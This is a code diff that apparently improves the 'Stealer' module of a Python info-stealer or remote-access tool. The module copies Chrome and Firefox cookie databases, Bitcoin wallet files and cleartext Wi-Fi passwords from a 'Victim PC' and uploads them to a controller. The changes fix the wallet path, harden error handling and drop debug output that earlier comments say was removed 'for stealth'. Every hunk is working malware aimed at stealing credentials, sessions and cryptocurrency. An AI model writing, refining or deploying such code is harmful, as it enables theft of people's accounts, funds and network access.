@@ -1,4 +1,4 @@
-import tempfile, subprocess, re, os, getpass, shutil, glob # Added glob for Firefox profile discovery
+import tempfile, subprocess, re, os, getpass, shutil, glob
 from HTTPSocket import HTTPSocket
 
 class Stealer:
@@ -13,17 +13,23 @@ class Stealer:
             source = os.path.join("C:\\Users", self.username, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
             destination = os.path.join(self.tempdir, "CookiesCh.sqlite")
             
+            if not os.path.exists(source):
+                self.C.Log("Fail", "Chrome Cookies database not found.")
+                self.C.Send("CleanCommands")
+                return
+
             shutil.copyfile(source, destination)    
             
             self.C.Upload(destination)
             os.remove(destination)
             self.C.Send("CleanCommands")
             self.C.Log("Succ", "Stealed Chrome Cookies Successfully")
-        except Exception as e:
-            # print("[Error In Stealer, steal_chrome_cookie() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
+        except FileNotFoundError:
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        
+            self.C.Log("Fail", "Chrome Cookies database not found.")
+        except Exception as e:
+            self.C.Send("CleanCommands")
+            self.C.Log("Fail", "An unexpected error occurred stealing Chrome cookies: " + str(e))        
 
     def steal_firefox_cookie(self):
         #Firefox DB Path: C:\Users\USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles\<random_string>.default\cookies.sqlite            
@@ -50,18 +56,16 @@ class Stealer:
                 self.C.Send("CleanCommands")
                 self.C.Log("Fail", "Firefox cookies.sqlite not found in any profile.")
 
+        except FileNotFoundError:
+            self.C.Send("CleanCommands")
+            self.C.Log("Fail", "Firefox Browser or its cookies.sqlite not found.") 
         except Exception as e:
             self.C.Send("CleanCommands")
-            # print("[Error In Stealer, steal_firefox_cookie() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
-            if "No such file or directory" in str(e):
-                self.C.Log("Fail", "Firefox Browser or its cookies.sqlite not found.") 
-            else:
-                self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred stealing Firefox cookies: " + str(e)) 
 
     def steal_bitcoin_wallet(self):
         try:
-            wallet_path = os.path.join("C:\\Users", self.username, "AppData", "Bitcoin", "wallet.dat")
+            wallet_path = os.path.join("C:\\Users", self.username, "AppData", "Roaming", "Bitcoin", "wallet.dat") # Corrected path for Bitcoin core wallet
             if os.path.exists(wallet_path):
                 self.C.Upload(wallet_path)
                 self.C.Send("CleanCommands")
@@ -70,10 +74,8 @@ class Stealer:
                 self.C.Send("CleanCommands")
                 self.C.Log("Fail", "Bitcoin Wallet Not Found In Victim PC")                
         except Exception as e:
-            # print("[Error In Stealer, steal_bitcoin_wallet() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        
+            self.C.Log("Fail", "An unexpected error occurred stealing Bitcoin wallet: " + str(e))        
 
     def steal_wifi_password(self):
         """
@@ -85,43 +87,44 @@ class Stealer:
         """    
         try:
             wifi_password_file = os.path.join(self.tempdir, "WifiPassword.txt")
-            command = "netsh wlan show profile"
-            result = ""
+            command = ["netsh", "wlan", "show", "profile"]
+            result_output = []
 
-            networks = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-            networks = networks.decode(encoding="utf-8", errors="strict")
-            network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks) 
+            # Get list of Wi-Fi profiles
+            networks_process = subprocess.run(command, capture_output=True, text=True, errors="ignore", creationflags=subprocess.CREATE_NO_WINDOW)
+            networks_process.check_returncode() # Raise CalledProcessError if command failed
+            network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks_process.stdout)
 
             for network_name in network_names_list:
                 try:
-                    command = "netsh wlan show profile \"" + network_name + "\" key=clear"
-                    current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-                    current_result = current_result.decode(encoding="utf-8", errors="strict")        
+                    command_key_clear = ["netsh", "wlan", "show", "profile", network_name.strip(), "key=clear"]
+                    current_result_process = subprocess.run(command_key_clear, capture_output=True, text=True, errors="ignore", creationflags=subprocess.CREATE_NO_WINDOW)
+                    current_result_process.check_returncode()
+                    current_result = current_result_process.stdout
                     
-                    ssid = re.findall("(?:SSID name\\s*:\\s)(.*)", str(current_result))
-                    authentication = re.findall(r"(?:Authentication\\s*:\\s)(.*)", current_result)
-                    cipher = re.findall("(?:Cipher\\s*:\\s)(.*)", current_result)
-                    security_key = re.findall(r"(?:Security key\\s*:\\s)(.*)", current_result)
-                    password = re.findall("(?:Key Content\\s*:\\s)(.*)", current_result)
+                    ssid = re.findall("(?:SSID name\s*:\s)(.*)", current_result)
+                    authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
+                    cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
+                    security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
+                    password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                     
-                    result += "\n\nSSID           : " + (ssid[0].strip() if ssid else "N/A") + "\n"
-                    result += "Authentication : " + (authentication[0].strip() if authentication else "N/A") + "\n"
-                    result += "Cipher         : " + (cipher[0].strip() if cipher else "N/A") + "\n"
-                    result += "Security Key   : " + (security_key[0].strip() if security_key else "N/A") + "\n"
-                    result += "Password       : " + (password[0].strip() if password else "N/A") 
-                except Exception: 
-                    pass 
+                    result_output.append("\n\nSSID           : " + (ssid[0].strip() if ssid else "N/A"))
+                    result_output.append("Authentication : " + (authentication[0].strip() if authentication else "N/A"))
+                    result_output.append("Cipher         : " + (cipher[0].strip() if cipher else "N/A"))
+                    result_output.append("Security Key   : " + (security_key[0].strip() if security_key else "N/A"))
+                    result_output.append("Password       : " + (password[0].strip() if password else "N/A"))
+                except subprocess.CalledProcessError as e:
+                    result_output.append(f"\n\nError retrieving details for '{network_name.strip()}': {e.stderr.strip()}")
+                except Exception as e: 
+                    result_output.append(f"\n\nUnexpected error for '{network_name.strip()}': {e}")
         
-            with open(wifi_password_file, "w") as f:
-                f.write(result)
+            with open(wifi_password_file, "w", encoding="utf-8") as f:
+                f.write("\n".join(result_output))
                 
             self.C.Upload(wifi_password_file)   
             os.remove(wifi_password_file)
-            self.C.Log("Succ", "Wifi Password Retrived Successfully")
+            self.C.Log("Succ", "Wifi Password Retrieved Successfully")
             self.C.Send("CleanCommands")         
         except Exception as e:
-            # print("[Error In Stealer, steal_wifi_password() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred during WiFi password retrieval: " + str(e)) 
             self.C.Send("CleanCommands")           
-                    
